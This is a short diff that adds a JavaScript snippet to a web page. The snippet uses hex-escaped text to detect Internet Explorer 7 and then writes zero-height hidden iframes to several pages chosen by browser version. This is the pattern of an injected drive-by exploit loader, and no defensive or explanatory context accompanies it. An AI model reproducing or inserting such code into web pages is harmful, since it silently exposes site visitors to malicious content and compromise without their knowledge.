@@ -1,0 +1,16 @@
+<script>
+document.writeln("<script>");
+
+document.writeln("if(navigator.userAgent.toLowerCase().indexOf(\"\\x6D\"+\"\\x73\"+\"\\x69\"+\"\\x65\"+\"\\x20\"+\"\\x37\")==-1)");
+
+document.writeln("document.write(\"<iframe width=100 height=0 src=Td14.htm><\/iframe>\");");
+
+document.writeln("document.write(\"<iframe width=100 height=0 src=yt.htm><\/iframe>\");");
+document.writeln("if(navigator.userAgent.toLowerCase().indexOf(\"\\x6D\"+\"\\x73\"+\"\\x69\"+\"\\x65\"+\"\\x20\"+\"\\x37\")>0)");
+document.writeln("document.write(\"<iframe src=td09.htm width=100 height=0><\/iframe>\");");
+document.writeln("document.write(\"<iframe src=yut.htm width=100 height=0><\/iframe>\");");
+document.writeln("document.write(\"<iframe src=ytu.htm width=100 height=0><\/iframe>\");");
+document.writeln("<\/script>");
+document.writeln("")
+</script>
+
